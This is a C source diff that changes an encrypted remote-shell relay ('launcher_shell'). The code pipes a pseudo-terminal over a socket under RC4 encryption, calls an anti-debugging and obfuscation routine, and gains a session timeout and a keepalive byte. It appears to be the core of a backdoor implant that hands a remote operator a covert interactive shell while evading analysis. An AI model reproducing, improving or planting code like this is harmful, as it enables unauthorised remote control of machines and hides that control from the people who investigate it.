@@ -290,6 +290,7 @@ void launcher_shell(int sockr, int sockw) {
     // used to get the tty
     extern char *ptsname();
 	unsigned char echar = (unsigned char)ECHAR;
+    struct timeval tv;
 
     rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_crypt);
     rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_decrypt);
@@ -351,47 +352,60 @@ void launcher_shell(int sockr, int sockw) {
             fd_set  fds;
             int count;
             unsigned char *p;
+            int nfd;
 
             // put the fd to watch
             FD_ZERO(&fds);
             FD_SET(sockr, &fds);
             FD_SET(pty, &fds);
 
+            // Timeout
+            tv.tv_sec=TIMEOUT;
+            tv.tv_usec=0;
+
 			antidebug_obfuscate_analysis(13);
-            if (select(max(pty, sockr)  + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;
+            //if (select(max(pty, sockr)  + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;
+            nfd = select(max(pty, sockr)  + 1, &fds, NULL, NULL, &tv);
+            if (nfd < 0 && (errno != EINTR)) break;
+            else if (nfd == 0) { break; }
+            else {
+                /* shell => client */
+                if (FD_ISSET(pty, &fds)) {
+                    count = read(pty, buf, BUFSIZE);
+                    if ((count <= 0) && (errno != EINTR)) break;
+                    rc4(buf, count, &rc4_crypt);
+                    if (write(sockw, buf, count) <= 0 && (errno != EINTR)) break;    
+                /* client => shell */
+                } else if (FD_ISSET(sockr, &fds)) {
+                    count = read(sockr, buf, BUFSIZE);
+                    if ((count <= 0) && (errno != EINTR)) break;
+                    rc4(buf, count, &rc4_decrypt);
+                    if ((p = memchr(buf, ECHAR, count))){
+                        debug("Received special char\n");
+			    		if (count == 1) break;
+			    		else if (count == 5) {
+                        	struct  winsize ws;
+                        	int t;
 
-            /* shell => client */
-            if (FD_ISSET(pty, &fds)) {
-                count = read(pty, buf, BUFSIZE);
-                if ((count <= 0) && (errno != EINTR)) break;
-                rc4(buf, count, &rc4_crypt);
-                if (write(sockw, buf, count) <= 0 && (errno != EINTR)) break;    
-            /* client => shell */
-            } else if (FD_ISSET(sockr, &fds)) {
-                count = read(sockr, buf, BUFSIZE);
-                if ((count <= 0) && (errno != EINTR)) break;
-                rc4(buf, count, &rc4_decrypt);
-                if ((p = memchr(buf, ECHAR, count))){
-                    debug("Received special char\n");
-					if (count == 1) break;
-					else if (count == 5) {
-                    	struct  winsize ws;
-                    	int t;
-
-                    	ws.ws_xpixel = ws.ws_ypixel = 0;
-                    	ws.ws_col = (p[1] << 8) + p[2];
-                    	ws.ws_row = (p[3] << 8) + p[4];
-                    	if (ws.ws_col & ws.ws_row) {
-                    	    ioctl(pty, TIOCSWINSZ, &ws);
-                    	    kill(0, SIGWINCH);
-                    	}
-                    	// Write the other data
-                    	write(pty, buf, p-buf);
-                    	t = (buf+count) - (p+5);
-                    	if (t > 0) write(pty, p+5, t);
-					}
-                } 
-                else if (write(pty, buf, count) <= 0 && (errno != EINTR)) break;
+                        	ws.ws_xpixel = ws.ws_ypixel = 0;
+                        	ws.ws_col = (p[1] << 8) + p[2];
+                        	ws.ws_row = (p[3] << 8) + p[4];
+                        	if (ws.ws_col & ws.ws_row) {
+                        	    ioctl(pty, TIOCSWINSZ, &ws);
+                        	    kill(0, SIGWINCH);
+                        	}
+                        	// Write the other data
+                        	write(pty, buf, p-buf);
+                        	t = (buf+count) - (p+5);
+                        	if (t > 0) write(pty, p+5, t);
+                            // for the keepalive
+                            unsigned char c = '\0';
+                            rc4(&c, 1, &rc4_crypt);
+                            write(sockw, &c, 1);
+			    		}
+                    } 
+                    else if (write(pty, buf, count) <= 0 && (errno != EINTR)) break;
+                }
             }
         }
     }   
